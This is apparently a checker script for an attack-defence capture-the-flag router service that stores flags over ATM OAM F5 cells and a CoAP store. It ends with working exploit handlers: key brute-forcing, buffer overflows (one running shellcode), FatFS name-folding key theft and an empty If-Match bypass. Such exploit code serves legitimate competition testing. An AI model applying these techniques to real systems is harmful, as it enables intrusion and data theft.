import asyncio
import collections
import collections.abc
import contextlib
import functools
import ipaddress
import itertools
import logging
import os
import typing
from logging import LoggerAdapter
from random import Random

import httpx
import yaml
from enochecker3 import (
    ChainDB,
    CheckerTaskMessage,
    DependencyInjector,
    Enochecker,
    EnocheckerException,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    InternalErrorException,
    MumbleException,
    OfflineException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
)

from patmy import (
    AtmClient,
    CallFailed,
    Circuit,
    CoapClient,
    CoapCode,
    CoapError,
    CoapType,
    ConnectionLost,
    ContentFormat,
    MessageType,
    parse_link_format,
)
from patmy.address import AddressError
from patmy.coap import WELL_KNOWN_CORE
from patmy.oam import OAM_PAYLOAD_SIZE, OamCell, OamType
from service import coap_store, dslam_socket, f5, generator, overflow, shellcode

checker_port = int(os.environ.get("CHECKER_PORT", "8000"))
service_port = int(os.environ.get("SERVICE_PORT", "9100"))
checker = Enochecker("router", service_port)


def app():
    application = checker.app

    # Wrapped rather than an on_startup handler: enochecker3 hands the app its
    # own lifespan, and Starlette ignores the on_startup list once one is set.
    enochecker_lifespan = application.router.lifespan_context

    @contextlib.asynccontextmanager
    async def lifespan(scope):
        async with enochecker_lifespan(scope):
            poller = asyncio.create_task(poll_numbering_plan())
            try:
                yield
            finally:
                poller.cancel()

    application.router.lifespan_context = lifespan
    return application


# How to connect to the DSLAM, and who to call.
dslam_host = os.environ.get("DSLAM_HOST", "dslam")
dslam_port = int(os.environ.get("DSLAM_PORT", "9000"))
dslam_config_port = int(os.environ.get("DSLAM_CONFIG_PORT", "80"))

NUMBERING_PLAN_RETRY_SECONDS = 5

_numbering_plan: dict | None = None

dslam_socket.register_dslam_socket(checker, dslam_host, dslam_port)


async def fetch_numbering_plan() -> dict:
    async with httpx.AsyncClient() as client:
        response = await client.get(f"http://{dslam_host}:{dslam_config_port}/numbering-plan.yaml")
    response.raise_for_status()
    return yaml.safe_load(response.text)


async def poll_numbering_plan() -> None:
    """Keeps asking the DSLAM for the numbering plan until it hands one over."""
    global _numbering_plan
    log = logging.getLogger(__name__)
    while _numbering_plan is None:
        try:
            _numbering_plan = await fetch_numbering_plan()
        except (httpx.HTTPError, yaml.YAMLError):
            log.warning("No numbering plan from the DSLAM yet, retrying", exc_info=True)
            await asyncio.sleep(NUMBERING_PLAN_RETRY_SECONDS)
    log.info("Got the numbering plan from the DSLAM")


async def numbering_plan(logger: LoggerAdapter) -> dict:
    """The numbering plan, fetched once more here if the poller has not got it yet."""
    global _numbering_plan
    if _numbering_plan is None:
        try:
            _numbering_plan = await fetch_numbering_plan()
        except (httpx.HTTPError, yaml.YAMLError) as error:
            logger.exception(f"No numbering plan from the DSLAM at {dslam_host}:{dslam_config_port}")
            raise InternalErrorException("No numbering plan") from error
    return _numbering_plan


async def number_for_team(address: str, logger: LoggerAdapter) -> str:
    """Turns a team's router address into a phone number based on the numbering plan"""
    # We have to handle invalid addresses here and report OFFLINE to satisfy the tests
    try:
        ipaddress.ip_address(address)
    except ValueError as error:
        raise OfflineException("Invalid IP address provided") from error
    fixed = (await numbering_plan(logger)).get("fixed", {})

    if (number := fixed.get(address)) is None:
        logger.error(f"No phone number for {address} in numbering plan")
        raise InternalErrorException("Team has no assigned number")
    if not isinstance(number, str):
        logger.error(f"Number for {address} is {number!r}, not a string (quote it in the numbering plan)")
        raise InternalErrorException("Malformed numbering plan")
    return number


@contextlib.asynccontextmanager
async def call(
    task: CheckerTaskMessage, logger: LoggerAdapter, di: DependencyInjector
) -> collections.abc.AsyncGenerator[Circuit]:
    """Dials the team's router through the DSLAM and hangs up again afterwards."""
    number = await number_for_team(task.address, logger)
    try:
        client = await di.get(AtmClient)
    except (OSError, EOFError, TimeoutError) as error:
        # If connecting to the DSLAM fails, that's on our side. EOFError covers the
        # asyncio.IncompleteReadError we get when the DSLAM accepts and then closes
        # before it has sent us our AESA.
        logger.exception(f"Failed to connect to DSLAM at {dslam_host}:{dslam_port}")
        raise InternalErrorException("Failed to connect to DSLAM") from error

    async with client:
        logger.debug("Calling %s (%s) as %s", number, task.address, client.address)
        try:
            circuit = await client.call(number)
        except CallFailed as error:
            # Signalling the team failed.
            if error.error is MessageType.UNREACHABLE:
                logger.info(f"{number} is offline (signalling reported unreachable)")
                raise OfflineException("The router is not answering calls") from error
            elif error.error in (
                MessageType.INVALID_ADDRESS,
                MessageType.NOT_PERMITTED,
                MessageType.QUOTA_EXCEEDED,
                MessageType.CONGESTED,
            ):
                logger.exception(f"The DSLAM refused our call to {number}: {error.error.name}")
                raise InternalErrorException("DSLAM refusal") from error
            else:
                logger.info(f"{number} refused our call: {error.error.name}")
                raise MumbleException("The router refused our call") from error
        except TimeoutError as error:
            # This is on our side (here or the DSLAM), since the DSLAM should always answer.
            logger.exception(f"The DSLAM did not answer our call to {number}")
            raise InternalErrorException("The DSLAM did not answer our call") from error
        try:
            yield circuit
        finally:
            try:
                await client.hangup(circuit)
            except (ConnectionLost, TimeoutError, CallFailed, OSError):
                logger.exception(f"Failed to hang up call to {number}")
                # ... and ignore it, so we don't poison a genuine error from earlier.
                # This used to be a contextlib.suppress, but I'd like to see the logs


class ExceptionGuard:
    """Turns the ways this can go wrong into the verdicts the engine knows."""

    def __init__(self, logger: LoggerAdapter, task: CheckerTaskMessage | None = None):
        self.logger = logger
        self.task = f"{task.method} {task.variant_id}" if task else "Task"

    def __enter__(self) -> typing.Self:
        return self

    def __exit__(self, exception_type, exception, traceback) -> None:
        if exception_type is None:
            return
        info = (exception_type, exception, traceback)
        if issubclass(exception_type, ConnectionLost):
            self.logger.exception(f"{self.task}: connection dropped unexpectedly", exc_info=info)
            raise MumbleException("Connection dropped unexpectedly")
        if issubclass(exception_type, AddressError):
            # Addresses only ever come from our numbering plan or from the DSLAM,
            # so a bad one is never the team's fault.
            self.logger.exception(f"{self.task}: attempted to use a bad address", exc_info=info)
            raise InternalErrorException("Bad address in numbering plan")
        if issubclass(exception_type, TimeoutError):
            self.logger.exception(f"{self.task}: connection timed out", exc_info=info)
            raise MumbleException("The router did not answer in time")
        if issubclass(exception_type, f5.F5ProtocolError):
            # Only the responses the service sends are actually its fault
            self.logger.exception(f"{self.task}: bad OAM F5 response", exc_info=info)
            raise MumbleException("Invalid response")
        if issubclass(exception_type, f5.F5UsageError):
            self.logger.exception(f"{self.task}: checker attempted invalid OAM F5 request", exc_info=info)
            raise InternalErrorException("Invalid request")
        if issubclass(exception_type, coap_store.StoreProtocolError):
            self.logger.exception(f"{self.task}: bad flag store response", exc_info=info)
            raise MumbleException("Invalid response")
        if issubclass(exception_type, CoapError):
            # Anything the CoAP layer itself refuses to make sense of, a RST included
            self.logger.exception(f"{self.task}: bad CoAP message", exc_info=info)
            raise MumbleException("Invalid response")


def exception_guard(function):
    """Wraps a handler inside an `ExceptionGuard`."""

    @functools.wraps(function)
    async def wrapper(*args, **kwargs):
        values = (*args, *kwargs.values())
        logger = next((value for value in values if isinstance(value, LoggerAdapter)), None)
        task = next((value for value in values if isinstance(value, CheckerTaskMessage)), None)
        with ExceptionGuard(logger or LoggerAdapter(logging.getLogger(__name__), {}), task):
            return await function(*args, **kwargs)

    return wrapper


# Finally, the actual checker


@checker.health
async def health_check():
    logger = logging.LoggerAdapter(
        checker._logger,
        extra={
            "service_name": checker.service_name,
            "checker_name": checker.checker_name,
            "checker_task": None,
        },
    )
    try:
        client = await AtmClient.connect(dslam_host, int(dslam_port), logger=logger)
        await client.aclose()
    except (OSError, EOFError, TimeoutError) as error:
        raise EnocheckerException(f"DSLAM at {dslam_host}:{dslam_port} is unreachable: {error}") from error

    await numbering_plan(logger)
    await checker._default_health()


def check_f5_retrieval(
    retrieval: f5.Retrieval,
    record: f5.Record,
    expected: bytes,
    logger: LoggerAdapter,
    *,
    corrupted: str = "Stored data is corrupted",
    missing: str = "Stored data is corrupted or missing",
) -> None:
    """Checks an OAM/F5 GET response"""
    if not retrieval.authenticate(record):
        logger.info(f"Record {record} returned bad tag {retrieval.mac.hex()}")
        raise MumbleException(corrupted)
    if (plaintext := retrieval.plaintext(record)).rstrip(b"\0") != expected.rstrip(b"\0"):
        logger.info(f"Record {record} returned plaintext {plaintext!r}, expected {expected!r}")
        raise MumbleException(missing)


@checker.putflag(0)
@exception_guard
async def put_flag_via_f5(
    task: PutflagCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, di: DependencyInjector
) -> str:
    """Stores the flag via an OAM F5 "PUT" message"""
    async with call(task, logger, di) as circuit:
        record = await f5.Client(circuit, logger=logger).put(task.flag.encode())
        logger.info(f"Flag stored in record {record}")
        # Persist before any failure during hangup
        await db.set("record", (record.id.hex(), record.key.hex()))
    return record.id.hex()


@checker.getflag(0)
@exception_guard
async def get_flag_via_f5(
    task: GetflagCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, rng: Random, di: DependencyInjector
) -> None:
    """Retrieves the flag (and proof of key ownership) via an OAM F5 "GET" message"""
    try:
        identifier, key = await db.get("record")
    except KeyError as error:
        raise MumbleException("Previous store failed") from error
    record = f5.Record.from_hex(identifier, key)
    nonce = rng.randbytes(rng.randint(4, f5.DATA_SIZE))

    async with call(task, logger, di) as circuit:
        retrieval = await f5.Client(circuit, logger=logger).get(record, nonce=nonce)

    check_f5_retrieval(
        retrieval, record, task.flag.encode(), logger, corrupted="Flag is corrupted", missing="Flag is missing"
    )


@checker.putflag(1)
@exception_guard
async def put_flag_via_coap(
    task: PutflagCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, rng: Random, di: DependencyInjector
) -> str:
    """Claims a key in the CoAP store and writes the flag under it"""
    key = generator.coap_key(rng)
    handle = generator.coap_handle()

    async with call(task, logger, di) as circuit:
        client = coap_store.Client(circuit, rng=rng, logger=logger)
        try:
            await client.claim(key, handle)
        except coap_store.KeyTaken as error:
            # The key is ours and drawn at random, so nobody can have held it
            logger.info(f"Key {key!r} was already claimed")
            raise MumbleException("Failed to store data") from error
        # Persist the claim before the write, or a failure there loses the handle
        await db.set("entry", (key, handle.hex()))
        await client.put(key, task.flag.encode(), handle)
        logger.info(f"Flag stored under key {key!r}")

    return key


@checker.getflag(1)
@exception_guard
async def get_flag_via_coap(
    task: GetflagCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, rng: Random, di: DependencyInjector
) -> None:
    """Retrieves the flag from the CoAP store, presenting the handle it was claimed with"""
    try:
        key, handle = await db.get("entry")
    except KeyError as error:
        raise MumbleException("Previous store failed") from error

    async with call(task, logger, di) as circuit:
        try:
            value = await coap_store.Client(circuit, rng=rng, logger=logger).get(key, bytes.fromhex(handle))
        except coap_store.KeyMissing as error:
            logger.info(f"Key {key!r} is gone")
            raise MumbleException("Flag is missing") from error

    if value != task.flag.encode():
        logger.info(f"Key {key!r} returned {value!r}, expected the flag")
        raise MumbleException("Flag is corrupted")


@checker.putnoise(0)
@exception_guard
async def put_multiple_records_via_f5(
    task: PutnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, rng: Random, di: DependencyInjector
) -> None:
    """Stores records via OAM F5 "PUT" messages"""
    # Pick how many records and with what content
    count = max(2, round(rng.normalvariate(5, 1.5)))
    contents = [generator.any_f5_data(rng) for _ in range(count)]
    records = []

    # Store them
    async with call(task, logger, di) as circuit:
        client = f5.Client(circuit, logger=logger)
        for index, content in enumerate(contents):
            record = await client.put(content)
            logger.info(f"Noise stored in record {record}")
            records.append(record)
            if index < len(contents) - 1:
                await asyncio.sleep(rng.normalvariate(0.1, 0.025))

        # Persist before the call is torn down
        await db.set(
            "entries",
            tuple(
                (content.hex(), record.id.hex(), record.key.hex())
                for content, record in zip(contents, records, strict=True)
            ),
        )

    # Every record must have a distinct ID
    distinct = len({record.id for record in records})
    if distinct != len(records):
        logger.info(f"IDs reused between PUTs (got {distinct} IDs, expected {len(records)})")
        raise MumbleException("Failed to store data")

    # ... and a distinct key
    distinct = len({record.key for record in records})
    if distinct < len(records) - 1:
        # Once is coincidence, twice is enemy action
        logger.info(f"Keys reused between PUTs (got {distinct} keys in {len(records)} queries)")
        raise MumbleException("Key reused across records")


@checker.getnoise(0)
@exception_guard
async def get_multiple_records_via_f5(
    task: GetnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, rng: Random, di: DependencyInjector
) -> None:
    """Retrieves records via OAM F5 "PUT" messages"""
    # Of the things we just PUT, keep `retain` entries
    try:
        all_entries = await db.get("entries")
    except KeyError as error:
        raise MumbleException("Previous store failed") from error
    retain = round(rng.normalvariate(len(all_entries) - 1))
    retain = max(1, min(retain, len(all_entries)))
    selected = rng.sample(all_entries, retain)

    # Then, pick at least one of them to sample twice
    duplicate = max(1, round(rng.normalvariate(1, 0.5)))
    selected += rng.choices(selected, k=duplicate)

    # Decode the entries
    entries = [
        (bytes.fromhex(content), f5.Record.from_hex(id, key), generator.any_nonce(rng)) for content, id, key in selected
    ]

    # Retrieve and check each entry
    async with call(task, logger, di) as circuit:
        client = f5.Client(circuit, logger=logger)
        for content, record, nonce in entries:
            retrieval = await client.get(record, nonce=nonce)
            check_f5_retrieval(retrieval, record, content, logger)


@checker.putnoise(1)
@exception_guard
async def put_noise_via_coap(
    task: PutnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, rng: Random, di: DependencyInjector
) -> str:
    """Claims a key in the CoAP store and writes data under it"""
    key = generator.coap_key(rng)
    handle = generator.coap_handle()
    content = generator.any_coap_data(rng)

    async with call(task, logger, di) as circuit:
        client = coap_store.Client(circuit, rng=rng, logger=logger)
        try:
            await client.claim(key, handle)
        except coap_store.KeyTaken as error:
            # The key is ours and drawn at random, so nobody can have held it
            logger.info(f"Key {key!r} was already claimed")
            raise MumbleException("Failed to store data") from error
        # Persist the claim before the write, or a failure there loses the handle
        await db.set("entry", (key, handle.hex(), content))
        await client.put(key, content, handle)

    async with call(task, logger, di) as circuit:
        # Keys can only be claimed once
        client = coap_store.Client(circuit, rng=rng, logger=logger)
        again = await client.claim_raw(key.encode(), generator.coap_handle())
        if again.code != CoapCode.FORBIDDEN:
            raise coap_store.unexpected("Reclaiming", key, again, (CoapCode.FORBIDDEN,))

    return key


@checker.getnoise(1)
@exception_guard
async def get_noise_via_coap(
    task: GetnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, rng: Random, di: DependencyInjector
) -> None:
    """Retrieves data from the CoAP store, presenting the handle it was claimed with"""
    try:
        key, handle, content = await db.get("entry")
    except KeyError as error:
        raise MumbleException("Previous store failed") from error

    async with call(task, logger, di) as circuit:
        try:
            value = await coap_store.Client(circuit, rng=rng, logger=logger).get(key, bytes.fromhex(handle))
        except coap_store.KeyMissing as error:
            logger.info(f"Key {key!r} is gone")
            raise MumbleException("Flag is missing") from error

    if value != content:
        logger.info(f"Key {key!r} returned {value!r}, expected {content!r}")
        raise MumbleException("Stored data is corrupted")


@checker.havoc(0)
@exception_guard
async def havoc_oam_ignores_invalid(
    task: HavocCheckerTaskMessage, logger: LoggerAdapter, rng: Random, di: DependencyInjector
) -> None:
    """Checks the OAM/F5 implementation's robustness against invalid cells"""

    havoc_response_timeout = 2

    def plausible_oam_cell(rng: Random) -> OamCell:
        if rng.random() < 0.5:
            return OamCell(OamType.SYSTEM_MANAGEMENT, f5.Function.PUT, generator.any_f5_data(rng))
        else:
            nonce = generator.any_nonce(rng)
            payload = rng.randbytes(f5.ID_SIZE) + bytes([len(nonce)]) + nonce
            return OamCell(OamType.SYSTEM_MANAGEMENT, f5.Function.GET, payload)

    async def invalid_cells(circuit: Circuit, logger: LoggerAdapter, rng: Random):
        """Requests with bad type or function, bad EDC, or reserved bit set must be dropped"""
        # Build a few cells with bad type or function
        cells = []
        for _ in range(rng.randint(2, 3)):
            while True:
                oam_type, function = rng.randrange(0x10), rng.randrange(0x10)
                if oam_type != OamType.SYSTEM_MANAGEMENT or function not in (f5.Function.PUT, f5.Function.GET):
                    break
            cells.append(
                (
                    f"bad type or function ({oam_type:X}.{function:X})",
                    OamCell(oam_type, function, generator.any_bytes(f5.DATA_SIZE, OAM_PAYLOAD_SIZE, rng)),
                )
            )

        # One with a corrupted EDC
        corrupted = plausible_oam_cell(rng)
        corrupted.edc = OamCell.cell_edc(corrupted.to_bytes()) ^ rng.randrange(1, 0x400)
        cells.append(("corrupted EDC", corrupted))

        # One with reserved bits but a valid EDC
        reserved = plausible_oam_cell(rng)
        reserved.reserved = rng.randrange(1, 0x40)
        cells.append(("reserved bits", reserved))

        # Toss these cells through the circuit
        rng.shuffle(cells)
        circuit.drain_oam()
        for label, cell in cells:
            logger.debug(f"Sending cell with {label}")
            await circuit.send_oam(cell)
        try:
            answer = await circuit.recv_oam(havoc_response_timeout)
        except TimeoutError:
            return  # We didn't expect a response

        # A response is not fatal here. It's only bad if we kill the service
        logger.info(f"Responded to a cell it should have dropped ({answer.oam_type:X}.{answer.function:X})")

    async def garbage_in_padding(circuit: Circuit, logger: LoggerAdapter, rng: Random):
        """The reserved tail past the PUT/GET data must be ignored"""
        client = f5.Client(circuit, logger=logger)
        data, nonce = generator.any_f5_data(rng), generator.any_nonce(rng)
        record = await client.put(data, injected_padding=rng.randbytes(OAM_PAYLOAD_SIZE - f5.DATA_SIZE))
        padding = rng.randbytes(OAM_PAYLOAD_SIZE - f5.ID_SIZE - 1 - len(nonce))
        retrieval = await client.get(record, nonce=nonce, injected_padding=padding)
        check_f5_retrieval(retrieval, record, data, logger)

    async def unknown_record(circuit: Circuit, logger: LoggerAdapter, rng: Random):
        """A GET for a (probably) unused slot."""
        # This will almost assuredly collide with entries (empty, or otherwise)
        # at some point. But that doesn't matter. We just want to know if it survives.
        generation, slot = rng.randrange(0x8000), rng.randrange(0x4000)
        identifier = generation.to_bytes(2, "big") + slot.to_bytes(2, "big")
        client = f5.Client(circuit, timeout=havoc_response_timeout, logger=logger)
        try:
            await client.get(identifier, nonce=generator.any_nonce(rng))
        except TimeoutError:
            logger.info("Did not respond when querying unwritten record")
            return

    async def canary(circuit: Circuit, logger: LoggerAdapter, rng: Random, record: f5.Record, data: bytes):
        """A GET of the canary record has to work at any point"""
        retrieval = await f5.Client(circuit, logger=logger).get(record, nonce=generator.any_nonce(rng))
        check_f5_retrieval(retrieval, record, data, logger)

    checks = [
        invalid_cells,
        garbage_in_padding,
        unknown_record,
    ]
    rng.shuffle(checks)

    async with call(task, logger, di) as circuit:
        data = generator.any_f5_data(rng)
        record = await f5.Client(circuit, logger=logger).put(data)
        for check in checks:
            await check(circuit, logger, rng)
            await canary(circuit, logger, rng, record, data)


@checker.havoc(1)
@exception_guard
async def havoc_coap_traffic(
    task: HavocCheckerTaskMessage, logger: LoggerAdapter, rng: Random, di: DependencyInjector
) -> None:
    """Makes some CoAP queries so it's not entirely quiet there, and checks the answers."""

    key = generator.coap_key(rng)
    handle = generator.coap_handle()
    value = generator.any_coap_data(rng)
    retries = 3

    async def resource_listing(client: coap_store.Client, logger: LoggerAdapter, rng: Random) -> None:
        """A NON query on the /.well-known/core listing"""
        _ = rng

        for _ in range(retries):
            try:
                response = await client.coap.get(WELL_KNOWN_CORE, confirmable=False)
                # A NON request may be answered by a NON or a CON (§ 5.2.3)
                expected = (CoapType.NON, CoapType.CON)
                break
            except TimeoutError:
                logger.debug("Non-confirmable query to /.well-known/core timed out")
        else:
            # We tried this but the service was full all the time. So switch to a confirmable listing.
            logger.warning("Non-confirmable queries to /.well-known/core timed out, switching to CON")
            response = await client.coap.get(WELL_KNOWN_CORE)
            # Piggybacked in the ACK, or a separate CON/NON response after an empty ACK (§ 5.2.1, § 5.2.2)
            expected = (CoapType.ACK, CoapType.CON, CoapType.NON)

        if response.code != CoapCode.CONTENT:
            raise coap_store.unexpected("GET", WELL_KNOWN_CORE, response, (CoapCode.CONTENT,))
        if response.type not in expected:
            allowed = " or ".join(t.name for t in expected)
            logger.info(f"GET {WELL_KNOWN_CORE} was answered by a {response.type.name}, expected a {allowed}")
            raise MumbleException("Invalid response")
        if response.content_format not in (None, ContentFormat.LINK_FORMAT):
            logger.info(f"GET {WELL_KNOWN_CORE} answered in content format {response.content_format}")
            raise MumbleException("Invalid response")

        links = parse_link_format(response.payload)
        if not any(
            link.path == f"/{coap_store.RESOURCE}" and link.content_format == ContentFormat.OCTET_STREAM
            for link in links
        ):
            listed = ", ".join(str(link) for link in links) or "nothing"
            logger.info(
                f"{WELL_KNOWN_CORE} lists {listed}, expected "
                f"</{coap_store.RESOURCE}>;ct={int(ContentFormat.OCTET_STREAM)}"
            )
            raise MumbleException("Invalid response")

    async def delete_is_refused(client: coap_store.Client, logger: LoggerAdapter, rng: Random) -> None:
        """DELETE-ing an entry is invalid."""
        _ = logger, rng
        response = await client.coap.delete([coap_store.RESOURCE, key], options=coap_store.if_match(handle))
        if response.code != CoapCode.METHOD_NOT_ALLOWED:
            raise coap_store.unexpected("DELETE", key, response, (CoapCode.METHOD_NOT_ALLOWED,))

    async def wrong_handle_is_refused(client: coap_store.Client, logger: LoggerAdapter, rng: Random) -> None:
        """Incorrect handles return 4.01."""
        _ = logger, rng

        wrong = generator.coap_handle()
        while wrong == handle:
            wrong = generator.coap_handle()

        response = await client.get_raw(key, wrong)
        if response.code != CoapCode.UNAUTHORIZED:
            raise coap_store.unexpected("GET", key, response, (CoapCode.UNAUTHORIZED,))

    checks = [
        resource_listing,
        delete_is_refused,
        wrong_handle_is_refused,
    ]
    rng.shuffle(checks)

    put = False
    for check in checks:
        async with call(task, logger, di) as circuit:
            client = coap_store.Client(circuit, rng=rng, logger=logger)
            if not put:
                for _ in range(retries):
                    try:
                        await client.claim(key, handle)
                        await client.put(key, value, handle)
                    except coap_store.KeyTaken:
                        logger.info(f"Key {key!r} was already claimed")
                    else:
                        break
                    rng.getrandbits(rng.getrandbits(8))  # Randomly drain the RNG to make this less predictable
                    key = generator.coap_key(rng)
                else:
                    raise MumbleException("Failed to store data")
                put = True
            await check(client, logger, rng)


@checker.exploit(0, 0)
@exception_guard
async def exploit_f5_weak_key_generation(
    task: ExploitCheckerTaskMessage, logger: LoggerAdapter, di: DependencyInjector
) -> str:
    """Abuses the weak key generation in the OAM F5 key store to retrieve a flag."""
    if (record_id := task.attack_info) is None:
        raise InternalErrorException("Attack info is missing")
    identifier = bytes.fromhex(record_id)

    async with call(task, logger, di) as circuit:
        nonce = b"meow"
        retrieval = await f5.Client(circuit, logger=logger).get(identifier, nonce=nonce)

    # Milliseconds. So the expected search space is not actually 2**32, but 8*3600*1000 ~ 2**24
    process = await asyncio.create_subprocess_exec(
        "/tools/brute_force",
        "--quick",
        "--hours",
        "10",  # VM clock is a touch faster than real time, this is just to make sure.
        retrieval.ciphertext.hex(),
        retrieval.nonce.hex(),
        retrieval.mac.hex(),
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    stdout, stderr = await process.communicate()
    details = stderr.decode(errors="replace").strip()
    if process.returncode != 0:
        logger.info(f"Failed to recover the key for record {record_id}: {details}")
        raise MumbleException("Failed to recover the record key")

    logger.info(f"Recovered the key for record {record_id}: {details}")
    record = f5.Record(identifier, bytes.fromhex(stdout.decode().strip()))
    return retrieval.plaintext(record).rstrip(b"\0").decode()


@checker.exploit(1, 0)
@exception_guard
async def exploit_f5_buffer_overflow(
    task: ExploitCheckerTaskMessage, logger: LoggerAdapter, di: DependencyInjector
) -> str:
    """Abuses the buffer overflow in the OAM F5 key store to retrieve a flag."""
    if task.attack_info is None:
        raise InternalErrorException("Attack info is missing")
    record_id = bytes.fromhex(task.attack_info)

    async with call(task, logger, di) as circuit:
        nonce = b"meow".ljust(f5.DATA_SIZE) + b"\x00\x00"  # F5CS_NULL
        retrieval = await f5.Client(circuit, logger=logger).get(record_id, nonce=nonce)
        key = retrieval.ciphertext[: f5.KEY_SIZE]

    async with call(task, logger, di) as circuit:
        nonce = b"meow"
        retrieval = await f5.Client(circuit, logger=logger).get(record_id, nonce=nonce)

    return retrieval.plaintext(f5.Record(record_id, key)).decode()


@checker.exploit(2, 1)
@exception_guard
async def exploit_aal5_reassembly_overflow(
    task: ExploitCheckerTaskMessage, logger: LoggerAdapter, di: DependencyInjector
) -> str:
    """Runs code in a connection handler through the AAL5 reassembly overflow."""
    if (key := task.attack_info) is None:
        raise InternalErrorException("Attack info is missing")

    async with call(task, logger, di) as circuit:
        client = CoapClient.over(circuit, logger=logger)
        request = client.build(CoapCode.GET)
        block = shellcode.read_key(
            key.encode(),
            at=overflow.payload_offset(request),
            value_size=coap_store.VALUE_MAX,
        )
        value = await overflow.execute(client, overflow.plant(request, block))

    if value:
        summary = f"{value[:38]!r}"[1:] + ("..." if len(value) > 38 else "")
        logger.info(f"Connection handler answered with {len(value)} bytes: {summary}")
        return value.decode(errors="replace")

    raise MumbleException("Failed to take over connection handler")


@checker.exploit(3, 1)
@exception_guard
async def exploit_coap_key_folding(
    task: ExploitCheckerTaskMessage, logger: LoggerAdapter, rng: Random, di: DependencyInjector
) -> str:
    """Claims and reads a CoAP store entry via FatFS name folding"""
    if (key := task.attack_info) is None:
        raise InternalErrorException("Attack info is missing")
    handle = generator.coap_handle()

    async with call(task, logger, di) as circuit:
        client = coap_store.Client(circuit, rng=rng, logger=logger)
        for spelling in itertools.islice(coap_store.folded_spellings(key, rng), 64):
            claimed = await client.claim_raw(spelling, handle)
            if claimed.code == CoapCode.CREATED:
                break
            if claimed.code != CoapCode.FORBIDDEN:
                logger.info(f"Claiming {spelling!r} answered {claimed.code_name}")
                raise MumbleException("Failed to claim a folded key")
        else:
            raise MumbleException("Every folded spelling we tried was already claimed")

        logger.info(f"Claimed {spelling!r} to retrieve {key!r}")
        response = await client.get_raw(spelling, handle)

    if response.code != CoapCode.CONTENT:
        logger.info(f"Got {response.code_name} from GET to {spelling!r}")
        raise MumbleException("Failed to read the flag through a folded key")
    return response.payload.decode()


@checker.exploit(4, 1)
@exception_guard
async def exploit_coap_empty_if_match(
    task: ExploitCheckerTaskMessage, logger: LoggerAdapter, di: DependencyInjector
) -> str:
    """Zero-length If-Match matches any representation, per the spec, so it bypasses the handle check."""
    if (key := task.attack_info) is None:
        raise InternalErrorException("Attack info is missing")

    async with call(task, logger, di) as circuit:
        response = await coap_store.Client(circuit, logger=logger).get_raw(key, b"")

    if response.code != CoapCode.CONTENT:
        logger.info(f"An empty If-Match on {key!r} answered {response.code_name}")
        raise MumbleException("Failed to read the flag with an empty If-Match")
    return response.payload.decode()


if __name__ == "__main__":
    checker.run(checker_port)
